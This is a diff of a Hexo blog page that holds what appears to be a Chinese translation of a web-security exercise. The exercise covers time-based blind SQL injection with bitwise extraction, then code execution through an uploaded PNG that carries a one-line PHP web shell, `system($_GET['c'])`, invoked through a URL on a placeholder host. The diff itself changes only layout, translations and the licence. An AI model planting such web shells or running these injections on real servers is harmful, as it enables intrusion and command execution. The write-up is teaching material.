@@ -119,8 +119,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -142,7 +149,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -279,35 +286,14 @@
 <p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032003.png" alt=""></p>
 <p>我们将使用这些属性来分离每个比特的信息。</p>
 <p>我们可以使用 <strong>&amp;1</strong> 分离第一位：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032004.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032004.png" alt=""></p>
 <p>返回值为第一位是1。此值将产生一个 <strong>true</strong> 的状态和响应将是缓慢的。</p>
 <p><strong>&amp;</strong> 用于分离，<strong>1</strong>用于指明第一位。作为一个说明：2 ^ 0等于1。</p>
 <p>我们可以使用 <strong>&amp;2</strong>来移动到第二位（2^1 等于 2）：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032005.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032005.png" alt=""></p>
 <p>返回值为第二位是0。0将产生一个 <strong>false</strong> 的状态并且响应会很快。</p>
 <p>我们可以继续移动到第三位通过 <strong>&amp;4</strong> （2^2 等于 4）：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032006.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032006.png" alt=""></p>
 <p>返回值为第三位1。4值将产生一个 <strong>true</strong> 的状态并且响应将被推迟。</p>
 <p>我们可以继续获取第一个字节的所有位。对于每一位，你将需要添加值（它的结果是true）作为一个变量。这个变量将包含最后的字节，当你检索所有位之后。</p>
 <p>我们可以把一切都在2个循环中，每一个字符和当前字符的每一位：</p>
@@ -323,24 +309,8 @@
 
 <p>这个用户看起来并没有 <strong>FILE</strong> 权限。在另一项练习，我们将看到我们如何检查并且得得它的代码执行。</p>
 <p>要获取多个行，我们只需要添加另一个循环到脚本中，每次检索一行。我们可以分离每一行行通过使用SQL关键字 <strong>LIMIT</strong> 。下表说明了 <strong>LIMIT</strong> 行为：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032007.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032008.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032007.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032008.png" alt=""></p>
 <p>注：<strong>as id</strong> 只是用来使MySQL输出更容易阅读。</p>
 <p>现在我们知道了如何分离每一行。我们可以通过循环每一行获取所有的结果。<br>我们只需要：  </p>
 <ul>
@@ -421,14 +391,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> strings malicious.png | grep system</span></span><br><span class="line">&lt;?php system($_GET['c']); ?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>我们现在可以上传自己的图像。一旦上传，我们需要通过检查网页的源文件来检索路径。我们可以通过添加“PHP扩展”和我们要运行的命令来访问图像。例如，如果上传的文件被命名为 <strong>1369904954.png</strong> ,我们可以访问<a href="http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a" target="_blank" rel="noopener" title="http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a">http://vulnerable/admin/uploads/1369904954.png/c.php?c=uname%20-a</a>来执行代码。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032009.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032009.png" alt=""></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个练习将教你如何手动检测和利用SQL盲注获得一个网站管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。这个练习是一个很好的例子有多小技巧可以影响Web服务器的性能并且允许攻击者控制它。</p>
 
         </div>
@@ -438,7 +401,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-08-29T06:29:50.630Z" itemprop="dateUpdated">2019-08-29 14:29:50</time>
+    Last updated: <time datetime="2019-08-29T06:29:50.630Z" itemprop="dateUpdated">2019-08-29 14:29:50</time>
 </span><br>
 
 
@@ -605,11 +568,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
